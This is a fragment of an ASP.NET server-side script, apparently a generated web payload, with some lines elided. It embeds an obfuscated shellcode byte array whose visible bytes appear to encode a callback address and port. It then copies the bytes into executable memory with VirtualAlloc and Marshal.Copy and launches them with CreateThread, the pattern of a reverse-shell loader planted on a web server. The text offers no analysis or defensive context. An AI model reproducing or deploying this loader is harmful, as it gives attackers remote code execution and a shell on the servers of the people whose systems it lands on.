...
<script runat="server">
    ...
    {
        byte[] ryuSlF0gdkjx = new byte[324] {
...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x0e,0x02,0x68,0x02,0x00,0x22,0xb8,0x89,
...
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr i173er = VirtualAlloc(IntPtr.Zero,(UIntPtr)ryuSlF0gdkjx.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(ryuSlF0gdkjx,0,i173er,ryuSlF0gdkjx.Length);
        IntPtr j0FggP_8Q = IntPtr.Zero;
        IntPtr cqP3i = CreateThread(IntPtr.Zero,UIntPtr.Zero,i173er,IntPtr.Zero,0,ref j0FggP_8Q);
    }
</script>
